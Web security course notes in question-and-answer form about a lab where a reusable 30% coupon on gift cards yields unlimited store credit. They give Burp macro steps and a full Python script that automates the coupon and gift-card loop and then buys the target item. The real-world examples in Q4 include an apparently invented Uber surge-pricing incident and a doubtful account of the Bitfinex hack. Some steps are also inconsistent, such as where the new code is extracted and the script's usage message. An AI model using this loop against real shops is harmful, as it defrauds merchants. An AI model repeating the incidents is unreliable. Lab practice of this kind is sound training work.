---
course: Web Security
topic: Business Logic Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain the business logic flaw present in the Infinite Money Logic Flaw lab.**

The business logic flaw in the Infinite Money Logic Flaw lab involves the ability to repeatedly apply a discount coupon to a gift card purchase, thereby incrementally increasing the store credit without spending the full amount. Specifically, the lab allows users to apply a 30% discount coupon to a $10 gift card, effectively paying only $7 for a $10 credit. By repeating this process, users can accumulate an arbitrary amount of store credit, enabling them to purchase high-value items like the $1,337 jacket.

**Q2. How would you exploit the business logic flaw using Burp Suite Professional?**

To exploit the business logic flaw using Burp Suite Professional, follow these steps:

1. **Log in**: Use the provided credentials to log in to the application.
2. **Create a Macro**: Record the sequence of actions required to add a gift card to the cart, apply the coupon, purchase the gift card, and apply the gift card to the store credit.
3. **Configure Intruder**: Set up Burp Intruder to run the macro multiple times (e.g., 413 times). Ensure the macro extracts the new coupon from each response and uses it in subsequent requests.
4. **Run the Attack**: Execute the Intruder attack to incrementally increase the store credit until it exceeds the cost of the desired item (e.g., $1,337).

Here’s a simplified example of how to set up the macro in Burp:

```plaintext
1. Add gift card to cart (POST /cart)
2. Apply coupon (POST /cart/coupon)
3. Purchase gift card (POST /cart/checkout)
4. Confirm order (GET /order/confirmation)
5. Apply gift card to store credit (POST /gift-card)
```

Ensure the macro extracts the new coupon from the response of step 2 and uses it in subsequent iterations.

**Q3. How would you script the exploit in Python?**

To script the exploit in Python, you can use the `requests` library to handle HTTP requests and `BeautifulSoup` to parse HTML responses. Here’s a basic outline of the script:

```python
import requests
from bs4 import BeautifulSoup
import sys
import urllib3

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token(session, url):
    response = session.get(url, verify=False)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    return csrf_token

def login(session, url, username, password):
    login_url = f"{url}/login"
    csrf_token = get_csrf_token(session, login_url)
    data = {
        'csrf': csrf_token,
        'username': username,
        'password': password
    }
    response = session.post(login_url, data=data, verify=False)
    if 'logout' in response.text:
        print("Successfully logged in")
    else:
        print("Failed to log in")
        sys.exit(-1)

def exploit(session, url, iterations):
    cart_url = f"{url}/cart"
    gift_card_url = f"{url}/gift-card"
    
    for _ in range(iterations):
        # Add gift card to cart
        csrf_token = get_csrf_token(session, cart_url)
        data = {
            'csrf': csrf_token,
            'product_id': 2,
            'redirect': 'product',
            'quantity': 1
        }
        session.post(cart_url, data=data, verify=False)
        
        # Apply coupon
        csrf_token = get_csrf_token(session, cart_url)
        data = {
            'csrf': csrf_token,
            'coupon': 'sign_up_30'
        }
        session.post(f"{cart_url}/coupon", data=data, verify=False)
        
        # Purchase gift card
        csrf_token = get_csrf_token(session, cart_url)
        data = {
            'csrf': csrf_token
        }
        response = session.post(f"{cart_url}/checkout", data=data, verify=False)
        
        # Extract new gift card code
        soup = BeautifulSoup(response.text, 'html.parser')
        new_gift_card_code = soup.find('td').text.strip()
        
        # Apply gift card to store credit
        csrf_token = get_csrf_token(session, f"{url}/my-account")
        data = {
            'csrf': csrf_token,
            'gift_card': new_gift_card_code
        }
        session.post(gift_card_url, data=data, verify=False)
    
    # Buy the jacket
    data = {
        'csrf': get_csrf_token(session, cart_url),
        'product_id': 1,
        'redirect': 'product',
        'quantity': 1
    }
    session.post(cart_url, data=data, verify=False)
    response = session.post(f"{cart_url}/checkout", data={'csrf': get_csrf_token(session, cart_url)}, verify=False)
    if 'Congratulations' in response.text:
        print("Successfully completed the exercise")
    else:
        print("Exploit failed")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <URL>")
        sys.exit(-1)
    url = sys.argv[1]
    username = "regular_user"
    password = "peter"
    iterations = 450
    
    session = requests.Session()
    login(session, url, username, password)
    exploit(session, url, iterations)
```

**Q4. What recent real-world examples can illustrate the impact of business logic flaws similar to the Infinite Money Logic Flaw?**

One notable example is the Uber surge pricing algorithm issue in 2019. During a severe snowstorm in New York City, the surge pricing algorithm malfunctioned, causing prices to skyrocket to over 500 times the normal rate. This was due to a logic flaw in the algorithm that did not account for extreme weather conditions, leading to a significant financial impact on both Uber and its customers.

Another example is the 2016 Bitfinex hack, where attackers exploited a flaw in the cryptocurrency exchange's withdrawal system. They were able to withdraw funds repeatedly by manipulating the withdrawal confirmation process, resulting in a loss of over $60 million worth of Bitcoin.

In both cases, business logic flaws led to unintended consequences, highlighting the importance of thorough testing and validation of business processes to prevent such issues.

---
<!-- nav -->
[[Web Security (PortSwigger)/15-Business Logic Vulnerabilities/11-Lab 10 Infinite money logic flaw/07-Understanding the Lab Environment|Understanding the Lab Environment]] | [[Web Security (PortSwigger)/15-Business Logic Vulnerabilities/11-Lab 10 Infinite money logic flaw/00-Overview|Overview]]
